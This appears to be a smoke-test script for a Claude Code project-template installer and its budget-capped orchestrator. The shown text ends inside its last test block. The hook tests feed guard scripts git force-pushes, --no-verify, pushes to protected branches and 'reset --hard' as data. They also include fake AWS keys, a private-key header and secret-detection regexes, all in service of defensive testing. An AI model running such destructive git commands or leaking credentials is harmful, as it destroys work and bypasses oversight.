#!/usr/bin/env node
// Smoke test for init.mjs: node test.mjs
// Runs init against several sample configs in a temp dir and checks the output.
import fs from 'node:fs';
import crypto from 'node:crypto';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath, pathToFileURL } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const INIT = path.join(HERE, 'init.mjs');
const base = fs.mkdtempSync(path.join(os.tmpdir(), 'claude-template-test-'));
let failed = 0;
// --only <text>[,<text>] runs just the sections/cases whose name contains the text; --list prints them.
const ONLY = (process.argv.includes('--only') ? String(process.argv[process.argv.indexOf('--only') + 1] || '') : '').split(',').map((s) => s.trim().toLowerCase()).filter(Boolean);
const LIST = process.argv.includes('--list');
const on = (n) => { if (LIST) { console.log(n); return false; } return !ONLY.length || ONLY.some((o) => n.toLowerCase().includes(o)); };
const check = (ok, msg) => { if (!ok) { failed++; console.error(`  ✖ ${msg}`); } else console.log(`  ✔ ${msg}`); };
const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]));
const run = (dir, extra = []) => spawnSync(process.execPath, [INIT, '--target', dir, ...extra], { encoding: 'utf8' });

const cases = {
  'laravel-docker': { yml: `name: Laravel App
type: web
stack: [laravel8, blade, mysql]
package_manager: composer
run_in_docker: true
docker: {dir: docker, service: app}
test_command: "php artisan test"
local_only: [".env", "db_backups/", "*.sql"]
branches: {working: dev1, integration: develop, production: main}
`, has: ['.claude/skills/ship/SKILL.md', '.agents/skills', '.codex/skills/ship/SKILL.md', '.claude/.template-version'],
    settings: (s) => s.permissions.deny.includes('Read(./**/vendor/**)') && s.permissions.deny.includes('Read(./**/*.sql)') && s.permissions.allow.some((a) => a.includes('docker compose exec app php artisan test')) },
  'mobile-no-docker': { yml: `name: Mobile
type: mobile
stack: [expo, typescript]
package_manager: pnpm
run_in_docker: false
test_command: "pnpm test"
branches: {working: feature/x, integration: "", production: main}
`, has: ['.claude/skills/react-native-development/SKILL.md'], hasNot: ['.claude/skills/ship', '.claude/skills/merge-to-dev'],
    settings: (s) => s.permissions.deny.includes('Read(./**/node_modules/**)') && s.permissions.allow.includes('Bash(pnpm test:*)') },
  'focused-skills': { yml: `name: Focused
type: api
stack: [python, fastapi, postgres]
package_manager: uv
run_in_docker: false
test_command: pytest
skills_mode: focused
branches: {working: x, integration: develop, production: main}
`, has: ['.claude/skills/python-development/SKILL.md'], hasNot: ['.claude/skills/react-native-development', '.claude/skills/vue-development'] },
};

for (const [name, c] of Object.entries(cases)) {
  if (!on(name)) continue;
  console.log(`\n[${name}]`);
  const dir = path.join(base, name);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'project.config.yml'), c.yml);
  const r1 = run(dir);
  check(r1.status === 0, `init exits 0${r1.status ? '\n' + r1.stderr : ''}`);
  for (const f of c.has || []) check(fs.existsSync(path.join(dir, f)), `exists ${f}`);
  for (const f of c.hasNot || []) check(!fs.existsSync(path.join(dir, f)), `absent ${f}`);
  const leftovers = walk(dir).filter((f) => /\.(md|json)$/i.test(f) && !f.includes('skills')).filter((f) => /\{\{[^}]*\}\}/.test(fs.readFileSync(f, 'utf8')));
  check(leftovers.length === 0, 'no {{placeholder}} left in generated rules/docs');
  const s = JSON.parse(fs.readFileSync(path.join(dir, '.claude', 'settings.json'), 'utf8'));
  if (c.settings) check(c.settings(s), 'settings.json deny/allow rules as expected');
  JSON.parse(fs.readFileSync(path.join(dir, '.claude', 'CONFIGURATION.MANIFEST.JSON'), 'utf8'));
  const r2 = run(dir);
  check(r2.status === 0 && /0 created, 0 updated/.test(r2.stdout), 'second run changes nothing (idempotent)');
}

if (on('hooks')) {
console.log('\n[hooks]');
{
  const hp = path.join(base, 'hooks'); fs.mkdirSync(hp, { recursive: true });
  const cfgYml = (extra = '') => `name: Hooks
type: web
stack: [laravel, mysql]
package_manager: composer
run_in_docker: false
test_command: "php artisan test"
local_only: ["db_backups/", "*.sql"]
branches: {working: dev1, integration: develop, production: main}
${extra}`;
  fs.writeFileSync(path.join(hp, 'project.config.yml'), cfgYml('format_command: "node fmt.mjs"\n'));
  fs.writeFileSync(path.join(hp, 'fmt.mjs'), "import fs from 'node:fs'; fs.appendFileSync(process.argv[2], '// formatted\\n');\n");
  spawnSync('git', ['init', '-q'], { cwd: hp });
  const setBranch = (b) => spawnSync('git', ['symbolic-ref', 'HEAD', `refs/heads/${b}`], { cwd: hp });
  check(run(hp).status === 0, 'init with hooks exits 0');
  const hs = JSON.parse(fs.readFileSync(path.join(hp, '.claude', 'settings.json'), 'utf8'));
  const cmds = (ev) => (hs.hooks[ev] || []).flatMap((g) => g.hooks.map((h) => h.command)).join('\n');
  check(/guard-bash\.mjs/.test(cmds('PreToolUse')) && /guard-secrets\.mjs/.test(cmds('PreToolUse')) && /format\.mjs/.test(cmds('PostToolUse')), 'settings.json registers guard-bash, guard-secrets and format');
  check(['lib', 'guard-bash', 'guard-secrets', 'format'].every((n) => fs.existsSync(path.join(hp, '.claude', 'hooks', `${n}.mjs`))) && fs.existsSync(path.join(hp, '.claude', 'hooks', 'config.json')), 'hook scripts and config.json copied');
  const r2 = run(hp);
  check(/0 created, 0 updated/.test(r2.stdout), 'hooks: second run changes nothing (idempotent)');

  const hook = (name, input) => spawnSync(process.execPath, [path.join(hp, '.claude', 'hooks', `${name}.mjs`)], { input: JSON.stringify({ cwd: hp, ...input }), encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: hp } });
  const bash = (command) => hook('guard-bash', { tool_name: 'Bash', tool_input: { command } });
  const write = (file_path, content = 'ok') => hook('guard-secrets', { tool_name: 'Write', tool_input: { file_path, content } });

  setBranch('dev1');
  check(bash('git status').status === 0 && bash('ls -la').status === 0, 'guard-bash: harmless commands allowed');
  check(bash('git commit -m "x"').status === 0, 'guard-bash: commit on working branch allowed');
  check(bash('git push origin dev1').status === 0 && bash('git push -u origin HEAD').status === 0, 'guard-bash: push of working branch allowed');
  check(bash('git push --force origin dev1').status === 2 && bash('git push -f').status === 2 && bash('git push origin +dev1').status === 2, 'guard-bash: force-push blocked');
  check(bash('git commit -m x --no-verify').status === 2 && bash('git push --no-verify').status === 2, 'guard-bash: --no-verify blocked');
  check(bash('git push origin main').status === 2 && bash('git push origin HEAD:main').status === 2 && bash('cd sub && git push origin develop').status === 2, 'guard-bash: push to protected branch blocked');
  check(bash('git commit -m "a\n\nCo-Authored-By: X <x@y.z>"').status === 2, 'guard-bash: attribution line blocked when commit_attribution is false');
  check(bash('git status && echo "git push --force"').status === 0, 'guard-bash: quoted text is not parsed as a command');
  const rh = bash('git reset --hard HEAD~1');
  check(rh.status === 0 && /"permissionDecision":"ask"/.test(rh.stdout), 'guard-bash: reset --hard asks the user');
  check(/"permissionDecision":"ask"/.test(bash('git branch -D old').stdout), 'guard-bash: branch -D asks the user');
  setBranch('main');
  check(bash('git commit -m x').status === 2 && bash('git push').status === 2, 'guard-bash: commit/push on protected branch blocked');
  setBranch('develop');
  check(bash('git -C . commit -m x').status === 2, 'guard-bash: integration branch is protected too');
  setBranch('dev1');

  const fake = ['AK', 'IA', 'ABCDEFGHIJKLMNOP'].join('');
  check(write(path.join(hp, '.env')).status === 2 && write('.env.production').status === 2, 'guard-secrets: .env writes blocked');
  check(write('.env.example').status === 0 && write('src/app.php').status === 0, 'guard-secrets: .env.example and normal files allowed');
  check(write('db_backups/dump.txt').status === 2 && write('x/y.sql').status === 2, 'guard-secrets: local_only paths blocked');
  check(write('src/config.php', `key = ${fake}`).status === 2, 'guard-secrets: secret-looking content blocked');
  check(hook('guard-secrets', { tool_name: 'Edit', tool_input: { file_path: 'a.php', new_string: `-----BEGIN RSA PRIVATE KEY-----` } }).status === 2, 'guard-secrets: Edit new_string checked');

  const target = path.join(hp, 'a.txt'); fs.writeFileSync(target, 'hi\n');
  const fr = hook('format', { tool_name: 'Write', tool_input: { file_path: target } });
  check(fr.status === 0 && /formatted/.test(fs.readFileSync(target, 'utf8')), 'format: runs format_command on the edited file');

  check(spawnSync(process.execPath, [path.join(hp, '.claude', 'hooks', 'guard-bash.mjs')], { input: 'not json', encoding: 'utf8' }).status === 1, 'hooks: invalid input reports an error (exit 1) instead of passing silently');

  // hooks: false removes ours and keeps foreign hooks
  const sp = path.join(hp, '.claude', 'settings.json');
  const cur = JSON.parse(fs.readFileSync(sp, 'utf8'));
  cur.hooks.PreToolUse.push({ matcher: 'Bash', hooks: [{ type: 'command', command: 'echo mine' }] });
  fs.writeFileSync(sp, JSON.stringify(cur, null, 2));
  fs.writeFileSync(path.join(hp, 'project.config.yml'), cfgYml('hooks: false\n'));
  check(run(hp).status === 0, 'init with hooks: false exits 0');
  const off = JSON.parse(fs.readFileSync(sp, 'utf8'));
  const offCmds = JSON.stringify(off.hooks || {});
  check(!/\.claude\/hooks\//.test(offCmds) && /echo mine/.test(offCmds), 'hooks: false removes ours but keeps foreign hooks');
}

}

if (on('yaml parser')) {
console.log('\n[yaml parser]');
{
  const head = 'name: P\ntype: web\nstack: [laravel]\n';
  const tail = 'branches: {working: a, integration: develop, production: main}\n';
  const bad = {
    'block scalar': [`${head}description: |\n  long text\n${tail}`, /line 4: block scalars/],
    'anchor': [`${head}notes: &n x\n${tail}`, /line 4: anchors/],
    'alias': [`${head}notes: *n\n${tail}`, /line 4: anchors/],
    'tab indent': [`${head}notes:\n\t- x\n${tail}`, /line 5: tabs are not allowed/],
    'duplicate key': [`${head}name: Again\n${tail}`, /line 4: duplicate key "name"/],
    'unclosed quote': [`${head}description: "oops\n${tail}`, /line 4: unterminated quoted string/],
    'unclosed list': [`${head}notes: [a, b\n${tail}`, /line 4: unclosed "\["/],
    'unclosed map': [`${head}notes: {a: 1\n${tail}`, /line 4: unclosed "\{"/],
    'missing space after colon': [`${head}url:http://x\n${tail}`, /line 4: cannot parse/],
    'merge key': [`${head}<<: x\n${tail}`, /line 4: .*merge keys/],
    'bad indentation': [`${head}notes:\n  - a\n    - b\n${tail}`, /line \d+: (bad|inconsistent) indentation/],
    'stray list item': [`${head}url: x\n- y\n${tail}`, /line 5: cannot parse .*unexpected list item/],
  };
  for (const [name, [yml, re]] of Object.entries(bad)) {
    const d = path.join(base, 'yaml-bad'); fs.mkdirSync(d, { recursive: true });
    fs.writeFileSync(path.join(d, 'project.config.yml'), yml);
    const r = run(d);
    check(r.status === 1 && re.test(r.stderr) && !/\n\s+at /.test(r.stderr), `rejects ${name} with a line-numbered message`);
  }
  // Accepted forms: BOM, leading ---, CRLF, list at the same indent as its key, comments.
  const d = path.join(base, 'yaml-ok'); fs.mkdirSync(d, { recursive: true });
  fs.writeFileSync(path.join(d, 'project.config.yml'), '﻿---\r\nname: Ok # comment\r\ntype: web\r\nstack:\r\n- laravel\r\n- mysql\r\nbranches: {working: a, integration: "", production: main}\r\nnotes:\r\n  - "a: b # not a comment"\r\n');
  const ok = run(d);
  check(ok.status === 0, `accepts BOM, leading ---, CRLF and same-indent lists${ok.status ? '\n' + ok.stderr : ''}`);
  check(fs.existsSync(path.join(d, '.claude/skills/laravel-best-practices/SKILL.md')) && /not a comment/.test(fs.readFileSync(path.join(d, '.claude/CLAUDE.md'), 'utf8')), 'parsed values reach the generated files (stack list, quoted # kept)');
}

}

if (on('core rules')) {
console.log('\n[core rules]');
{
  const d = path.join(base, 'laravel-docker');
  for (const f of ['CODE-QUALITY', 'SECURITY', 'TESTING', 'COMPLETION-REPORT', 'COMMANDS-TESTING']) check(fs.existsSync(path.join(d, '.claude/rules', `${f}.md`)), `rule installed: ${f}.md`);
  const total = fs.readdirSync(path.join(d, '.claude/rules')).reduce((n, f) => n + fs.statSync(path.join(d, '.claude/rules', f)).size, 0);
  check(total < 12000, `rules stay small (always-loaded): ${total} bytes < 12000`);
}

}

if (on('catalog')) {
console.log('\n[catalog]');
{
  const map = JSON.parse(fs.readFileSync(path.join(HERE, 'core', 'skill-map.json'), 'utf8'));
  const coreSkills = fs.readdirSync(path.join(HERE, 'core', 'skills'));
  const tplSkills = fs.readdirSync(path.join(HERE, 'templates', '.claude', 'skills'));
  const known = new Set([...coreSkills, ...tplSkills]);
  const referenced = new Set([...map.always, ...Object.values(map.types).flat(), ...Object.values(map.stack).flat(), ...Object.values(map.deps || {}).flat(), ...Object.values(map.domains || {}).flat()]);
  const dangling = [...referenced].filter((s) => !known.has(s));
  check(dangling.length === 0, `skill-map.json references only existing skills${dangling.length ? ': ' + dangling.join(', ') : ''}`);
  const fm = (f) => { const m = fs.readFileSync(f, 'utf8').match(/^---\r?\n([\s\S]*?)\r?\n---/); const o = {}; if (m) for (const l of m[1].split(/\r?\n/)) { const i = l.indexOf(':'); if (i > 0) o[l.slice(0, i).trim()] = l.slice(i + 1).trim().replace(/^"|"$/g, ''); } return o; };
  const badSkills = []; const longDesc = [];
  for (const s of coreSkills) {
    const f = path.join(HERE, 'core', 'skills', s, 'SKILL.md');
    const o = fs.existsSync(f) ? fm(f) : {};
    if (o.name !== s || !o.description || !/^Use /.test(o.description)) badSkills.push(s);
    if ((o.description || '').length > 260) longDesc.push(s);
  }
  check(badSkills.length === 0, `every core skill has frontmatter name == folder and a "Use ..." description${badSkills.length ? ': ' + badSkills.join(', ') : ''}`);
  check(longDesc.length === 0, `skill descriptions stay <= 260 chars (loaded every session)${longDesc.length ? ': ' + longDesc.join(', ') : ''}`);
  const badAgents = fs.readdirSync(path.join(HERE, 'core', 'agents')).filter((f) => { const o = fm(path.join(HERE, 'core', 'agents', f)); return o.name !== f.replace(/\.md$/, '') || !o.description; });
  check(badAgents.length === 0, `every agent has frontmatter name == file and a description${badAgents.length ? ': ' + badAgents.join(', ') : ''}`);
  const orphans = coreSkills.filter((s) => !referenced.has(s));
  check(orphans.length === 0, `every core skill is routed by skill-map.json${orphans.length ? ' (orphans: ' + orphans.join(', ') + ')' : ''}`);
}

}

if (on('skill routing eval')) {
console.log('\n[skill routing eval]');
{
  const r = spawnSync(process.execPath, [path.join(HERE, 'evals', 'run.mjs')], { encoding: 'utf8' });
  check(r.status === 0, `offline skill-trigger eval passes (${(r.stdout.match(/^\d+\/\d+ prompts.*$/m) || [''])[0]})${r.status ? '\n' + r.stdout : ''}`);
}

}

if (on('orchestrate')) {
console.log('\n[orchestrate]');
{
  const U = (f) => import(pathToFileURL(path.join(HERE, 'lib', f)).href);
  const st = await U('orch-state.mjs');
  const bu = await U('orch-budget.mjs');
  const pl = await U('orch-plan.mjs');
  // --- pure modules
  check(st.canTransition('queued', 'ready') && st.canTransition('validating', 'running') && st.canTransition('budget_exhausted', 'ready'), 'task state machine allows the documented transitions');
  check(!st.canTransition('completed', 'running') && !st.canTransition('queued', 'completed') && !st.canTransition('running', 'completed') && !st.canTransition('failed', 'ready'), 'task state machine rejects illegal transitions');
  const okLedger = { state: 'validating', profile: 'small', plan: { acceptance_criteria: ['x'] }, validation: { ran: true, exitCode: 0 } };
  check(st.transition(okLedger, 'completed').state === 'completed', 'completed is allowed with criteria and a passing validation record');
  const throws = (f) => { try { f(); return false; } catch { return true; } };
  check(throws(() => st.transition({ ...okLedger, validation: { ran: true, exitCode: 1 } }, 'completed')) && throws(() => st.transition({ ...okLedger, validation: null }, 'completed')) && throws(() => st.transition({ ...okLedger, plan: null }, 'completed')), 'completed is refused without evidence, with failing validation or without criteria');
  let b = bu.newBudget('small');
  check(bu.authorize(b).ok && bu.authorize(b).perCallUsd === 0.4, 'small profile starts with a 0.40 per-call cap');
  b = bu.record(b, { cost: 0.55 });
  check(bu.authorize(b).ok && Math.abs(bu.authorize(b).perCallUsd - 0.2) < 1e-9 && b.warned, 'per-call cap shrinks to the remaining budget and the 70% warning fires once');
  b = bu.record(b, { cost: 0.4 });
  check(!bu.authorize(b).ok && bu.authorize(b).reason === 'cost_cap', 'no dispatch once the cost cap is reached (overshoot is recorded, not hidden)');
  check(!bu.authorize({ ...bu.newBudget('tiny'), calls: 1 }).ok, 'call cap stops dispatch');
  const unk = bu.record(bu.newBudget('small'), { cost: null });
  check(unk.spent === 0 && unk.unknownCostCalls === 1, 'a call with no reported cost is counted as unavailable, never estimated');
  check(throws(() => bu.raiseCap(bu.newBudget('small'), 0.5)) && bu.raiseCap(bu.newBudget('small'), 2).max_estimated_cost === 2, 'the cap can only be raised to a strictly larger value');
  check(Math.abs(bu.raiseCap(bu.newBudget('small'), 1.5).per_call_cap - 0.8) < 1e-6, 'raising the overall cap scales the per-call cap');
  check(pl.validatePlan({ summary: 's', acceptance_criteria: ['a'], steps: [{ title: 't' }] }).ok && !pl.validatePlan({ summary: 's', steps: [] }).ok && pl.extractJson('```json\n{"a":1}\n```').value.a === 1, 'plan schema and JSON extraction work');
  check(!/hunter2|AKIA[0-9A-Z]{16}/.test(pl.redact('password=hunter2value and AKIAABCDEFGHIJKLMNOP and Bearer abcdefghijklmnop12')), 'secret-looking strings are redacted');

  // --- driver with a fake claude (no network, no cost)
  const FAKE = path.join(HERE, 'test-helpers', 'fake-claude.mjs');
  const sh = (cwd, cmd, a) => spawnSync(cmd, a, { cwd, encoding: 'utf8' });
  const mkRepo = (name) => {
    const d = path.join(base, 'orch', name); fs.mkdirSync(d, { recursive: true });
    sh(d, 'git', ['init', '-q']);
    fs.writeFileSync(path.join(d, 'a.txt'), 'one\n');
    fs.writeFileSync(path.join(d, 'check.mjs'), "import fs from 'node:fs'; process.exit(fs.readFileSync('a.txt', 'utf8').includes('two') ? 0 : 1);\n");
    sh(d, 'git', ['add', '-A']);
    sh(d, 'git', ['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'init']);
    return d;
  };
  const PLAN = JSON.stringify({ summary: 'make a.txt say two', acceptance_criteria: ['a.txt contains two'], steps: [{ title: 'edit a.txt', files: ['a.txt'] }], risks: [] });
  const orch = (repo, tag, steps, a, extraEnv = {}) => {
    const script = path.join(base, 'orch', `${tag}.script.json`); fs.writeFileSync(script, JSON.stringify(steps));
    const state = path.join(base, 'orch', `${tag}.state`); const log = path.join(base, 'orch', `${tag}.log`);
    if (a.includes('--goal') && fs.existsSync(state)) fs.rmSync(state);
    const r = spawnSync(process.execPath, [path.join(HERE, 'orchestrate.mjs'), '--target', repo, ...a], { encoding: 'utf8', env: { ...process.env, CLAUDE_BIN: FAKE, FAKE_SCRIPT: script, FAKE_STATE: state, FAKE_LOG: log, ...extraEnv } });
    const calls = fs.existsSync(log) ? fs.readFileSync(log, 'utf8').trim().split('\n').filter(Boolean).map((x) => JSON.parse(x)) : [];
    const od = path.join(repo, '.git', 'orchestrator');
    const id = fs.existsSync(od) ? fs.readdirSync(od)[0] : null;
    const ledger = id ? JSON.parse(fs.readFileSync(path.join(od, id, 'ledger.json'), 'utf8')) : null;
    const events = id && fs.existsSync(path.join(od, id, 'events.jsonl')) ? fs.readFileSync(path.join(od, id, 'events.jsonl'), 'utf8') : '';
    return { r, calls, ledger, events, id };
  };
  const T = ['--test-cmd', 'node check.mjs'];

  { // happy path
    const repo = mkRepo('happy');
    const o = orch(repo, 'happy', [{ result: PLAN, cost: 0.05 }, { result: 'done', cost: 0.1, write: { 'a.txt': 'two\n' } }], ['--goal', 'make a.txt say two', ...T]);
    check(o.r.status === 0 && o.ledger.state === 'completed' && o.ledger.validation.exitCode === 0 && o.calls.length === 2, `happy path completes with 2 model calls and a recorded test exit code${o.r.status ? '\n' + o.r.stdout + o.r.stderr : ''}`);
    check(/Efficiency report/.test(o.r.stdout) && /Validation: `node check.mjs` exited 0/.test(o.r.stdout) && Math.abs(o.ledger.budget.spent - 0.15) < 1e-9, 'report shows the real test result and actual cost');
    check(o.ledger.changedFiles.length === 1 && o.ledger.changedFiles[0].path === 'a.txt', 'changed files are recorded with their full path');
    check(o.calls.every((c) => !c.argv.includes('Bash')) && o.calls[1].argv.includes('Edit') && !o.calls[0].argv.includes('Edit'), 'no model step gets Bash; the planner cannot edit');
    check(o.calls.every((c) => Number(c.argv[c.argv.indexOf('--max-budget-usd') + 1]) <= 0.4), 'every call carries a per-call budget cap of at most 0.40');
    check(sh(repo, 'git', ['rev-parse', '--abbrev-ref', 'HEAD']).stdout.trim() === o.ledger.branch && /^orch\//.test(o.ledger.branch) && sh(repo, 'git', ['status', '--porcelain']).stdout.includes('a.txt'), 'work happens on a dedicated local branch and the ledger lives in .git, not the working tree');
  }
  { // one repair, then success
    const repo = mkRepo('repair');
    const o = orch(repo, 'repair', [{ result: PLAN, cost: 0.05 }, { result: 'done', cost: 0.05, write: { 'a.txt': 'wrong\n' } }, { result: 'fixed', cost: 0.05, write: { 'a.txt': 'two\n' } }], ['--goal', 'g', ...T]);
    check(o.r.status === 0 && o.ledger.budget.repairs === 1 && o.calls.length === 3 && o.ledger.validation.attempts === 2, 'a failing test triggers exactly one repair and a re-run');
  }
  { // repair fails: stop, no further calls
    const repo = mkRepo('repairfail');
    const o = orch(repo, 'repairfail', [{ result: PLAN, cost: 0.05 }, { result: 'x', cost: 0.05, write: { 'a.txt': 'wrong\n' } }, { result: 'y', cost: 0.05, write: { 'a.txt': 'still wrong\n' } }, { result: 'z', cost: 0.05, write: { 'a.txt': 'two\n' } }], ['--goal', 'g', ...T]);
    check(o.r.status === 1 && o.ledger.state === 'failed' && o.calls.length === 3 && /not verified/.test(o.r.stdout), 'a failed repair ends the task; there is no fourth call and the report says it is not verified');
  }
  { // hard stop on cost, then explicit resume
    const repo = mkRepo('hardstop');
    const steps = [{ result: PLAN, cost: 0.5 }, { result: 'x', cost: 0.9, write: { 'a.txt': 'wrong\n' } }, { result: 'fixed', cost: 0.1, write: { 'a.txt': 'two\n' } }];
    const o = orch(repo, 'hardstop', steps, ['--goal', 'g', ...T]);
    check(o.r.status === 3 && o.ledger.state === 'budget_exhausted' && o.calls.length === 2 && /cost_cap/.test(o.ledger.stateReason), 'stops with exit 3 at the cost cap, makes no further call, state is saved');
    check(Number(o.calls[1].argv[o.calls[1].argv.indexOf('--max-budget-usd') + 1]) <= 0.25 + 1e-9, 'the second call was capped at the remaining budget');
    const id = o.id;
    const noCap = orch(repo, 'hardstop', steps, ['--resume', id, ...T]);
    check(noCap.r.status === 2 && /explicit larger cap/.test(noCap.r.stderr) && noCap.calls.length === 2, 'resume without a larger --max-cost is refused');
    const lowCap = orch(repo, 'hardstop', steps, ['--resume', id, '--max-cost', '0.7']);
    check(lowCap.r.status === 2 && noCap.calls.length === 2, 'a cap that is not larger is refused');
    const up = orch(repo, 'hardstop', steps, ['--resume', id, '--max-cost', '3']);
    check(up.r.status === 0 && up.ledger.state === 'completed' && up.calls.length === 3, 'resume with a larger cap continues at the repair; plan and implement are not repeated');
  }
  { // a call that hits its per-call cap (real CLI: is_error, subtype error_max_budget_usd, cost above the cap)
    const repo = mkRepo('stepcap');
    const steps = [{ result: PLAN, cost: 0.05 }, { is_error: true, subtype: 'error_max_budget_usd', cost: 0.3, exit: 1, write: { 'a.txt': 'half\n' } }, { result: 'done', cost: 0.05, write: { 'a.txt': 'two\n' } }];
    const o = orch(repo, 'stepcap', steps, ['--goal', 'g', ...T]);
    check(o.r.status === 3 && o.ledger.state === 'budget_exhausted' && /step_cap/.test(o.ledger.stateReason) && Math.abs(o.ledger.budget.spent - 0.35) < 1e-9 && o.ledger.changedFiles.length === 1, 'a call that hits its per-call cap is a budget stop (not a plain failure), its real cost is recorded and partial edits are noted');
    const up = orch(repo, 'stepcap', steps, ['--resume', o.id, '--max-cost', '1.5']);
    check(up.r.status === 0 && up.ledger.state === 'completed' && up.calls.length === 3 && Number(up.calls[2].argv[up.calls[2].argv.indexOf('--max-budget-usd') + 1]) > 0.4, 'resume with a larger cap retries the step with a proportionally larger per-call cap');
  }
  { // stale evidence after a user edit, no model call needed
    const repo = mkRepo('stale');
    const steps = [{ result: PLAN, cost: 0.5 }, { result: 'x', cost: 0.9, write: { 'a.txt': 'wrong\n' } }];
    const o = orch(repo, 'stale', steps, ['--goal', 'g', ...T]);
    fs.writeFileSync(path.join(repo, 'a.txt'), 'two\n');
    const up = orch(repo, 'stale', steps, ['--resume', o.id, '--max-cost', '3']);
    check(up.r.status === 0 && up.calls.length === 2 && /resume_stale/.test(up.events), 'a file edited after the stop invalidates the old test evidence; tests re-run without any new model call');
  }
  { // tiny profile: one call, no repair
    const repo = mkRepo('tiny');
    const o = orch(repo, 'tiny', [{ result: 'x', cost: 0.05, write: { 'a.txt': 'wrong\n' } }], ['--goal', 'g', '--profile', 'tiny', ...T]);
    check(o.r.status === 1 && o.calls.length === 1 && o.ledger.budget.repairs === 0, 'tiny profile makes one call and never repairs');
  }
  { // unknown cost
    const repo = mkRepo('unknown');
    const o = orch(repo, 'unknown', [{ result: PLAN, cost: null }, { result: 'x', cost: null, write: { 'a.txt': 'two\n' } }], ['--goal', 'g', ...T]);
    check(o.r.status === 0 && o.ledger.budget.spent === 0 && o.ledger.budget.unknownCostCalls === 2 && /Cost: unavailable/.test(o.r.stdout), 'missing cost is reported as unavailable, never invented');
  }
  { // bad plan twice
    const repo = mkRepo('badplan');
    const o = orch(repo, 'badplan', [{ result: 'not json', cost: 0.01 }, { result: '{"summary":"x"}', cost: 0.01 }, { result: 'x', cost: 0.01, write: { 'a.txt': 'two\n' } }], ['--goal', 'g', ...T]);
    check(o.r.status === 1 && o.calls.length === 2 && o.ledger.state === 'failed' && !o.ledger.implemented, 'an invalid plan gets one correction attempt, then the task fails before any edit');
  }
  { // dirty tree
    const repo = mkRepo('dirty'); fs.writeFileSync(path.join(repo, 'mine.txt'), 'my work\n');
    const o = orch(repo, 'dirty', [{ result: PLAN }], ['--goal', 'g', ...T]);
    check(o.r.status === 2 && /uncommitted changes/.test(o.r.stderr) && o.calls.length === 0 && sh(repo, 'git', ['branch', '--list', 'orch/*']).stdout.trim() === '' && fs.readFileSync(path.join(repo, 'mine.txt'), 'utf8') === 'my work\n', 'a dirty working tree is refused and left untouched');
  }
  { // implementer changes nothing
    const repo = mkRepo('nochange');
    const o = orch(repo, 'nochange', [{ result: PLAN, cost: 0.01 }, { result: 'nothing to do', cost: 0.01 }], ['--goal', 'g', '--test-cmd', 'node -e "process.exit(0)"']);
    check(o.r.status === 1 && o.ledger.state === 'failed' && /no changes/.test(o.ledger.stateReason), 'a task with no changes is never marked completed, even when the tests already pass');
  }
  { // no test command
    const repo = mkRepo('notest');
    const o = orch(repo, 'notest', [{ result: PLAN, cost: 0.01 }, { result: 'x', cost: 0.01, write: { 'a.txt': 'two\n' } }], ['--goal', 'g']);
    check(o.r.status === 1 && o.ledger.state === 'blocked' && /NOT RUN/.test(o.r.stdout), 'without a test command the task is blocked and the report says nothing was verified');
  }
  { // secrets
    const repo = mkRepo('secrets');
    fs.writeFileSync(path.join(repo, 'noisy.mjs'), "console.log('password=hunter2value'); process.exit(1);\n");
    sh(repo, 'git', ['add', '-A']); sh(repo, 'git', ['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'noisy']);
    const o = orch(repo, 'secrets', [{ result: 'x', cost: 0.01, write: { 'a.txt': 'wrong\n' } }], ['--goal', 'use token=ABCDEF123456SECRET', '--profile', 'tiny', '--test-cmd', 'node noisy.mjs']);
    const dump = JSON.stringify(o.ledger) + o.events + o.r.stdout;
    check(!/ABCDEF123456SECRET|hunter2value/.test(dump) && /\[redacted\]/.test(dump), 'secret-looking strings from the goal and test output are redacted from the ledger, events and report');
  }
}
}

if (on('eval arms')) {
console.log('\n[eval arms]');
{
  // The scenario runner's baseline and orchestrated arms against a fake claude: no network, no cost.
  const FAKE = path.join(HERE, 'test-helpers', 'fake-claude.mjs');
  const sol = path.join(HERE, 'evals', 'scenarios', 'migration-lock-safety', 'solution');
  const files = {};
  for (const f of walk(sol)) files[path.relative(sol, f).split(path.sep).join('/')] = fs.readFileSync(f, 'utf8');
  const plan = JSON.stringify({ summary: 's', acceptance_criteria: ['migrations added'], steps: [{ title: 't' }], risks: [] });
  const dir = path.join(base, 'evalarms'); fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'script.json'), JSON.stringify([{ result: 'done', cost: 0.07, turns: 6, write: files }, { result: plan, cost: 0.05, turns: 4 }, { result: 'done', cost: 0.06, turns: 5, write: files }]));
  const out = path.join(dir, 'results', 'r.json');
  const r = spawnSync(process.execPath, [path.join(HERE, 'evals', 'scenarios.mjs'), '--scenario', 'migration-lock-safety', '--arms', 'baseline,orchestrated', '--runs', '1', '--out', out], { encoding: 'utf8', env: { ...process.env, CLAUDE_BIN: FAKE, FAKE_SCRIPT: path.join(dir, 'script.json'), FAKE_STATE: path.join(dir, 'state') } });
  const res = fs.existsSync(out) ? JSON.parse(fs.readFileSync(out, 'utf8')) : { runs: [] };
  const b = res.runs.find((x) => x.arm === 'baseline'); const o = res.runs.find((x) => x.arm === 'orchestrated');
  check(r.status === 0 && res.runs.length === 2 && b && b.pass && Math.abs(b.cost - 0.07) < 1e-9 && typeof b.seconds === 'number', `baseline arm records cost, turns and seconds from the CLI output${r.status ? '\n' + r.stderr + r.stdout : ''}`);
  check(o && o.pass && Math.abs(o.cost - 0.11) < 1e-9 && o.turns === 9 && o.calls === 2 && o.orchState === 'completed', 'orchestrated arm records cost, turns and calls from the driver ledger and still grades with the scenario graders');
  const rep = spawnSync(process.execPath, [path.join(HERE, 'evals', 'report.mjs'), '--results', path.dirname(out), '--out', path.join(dir, 'REPORT.md')], { encoding: 'utf8' });
  const text = fs.existsSync(path.join(dir, 'REPORT.md')) ? fs.readFileSync(path.join(dir, 'REPORT.md'), 'utf8') : '';
  check(rep.status === 0 && /\| orchestrated \| 1 \| 1\/1/.test(text) && /Cost per passing run/.test(text), 'report has a per-arm table with cost per passing run');
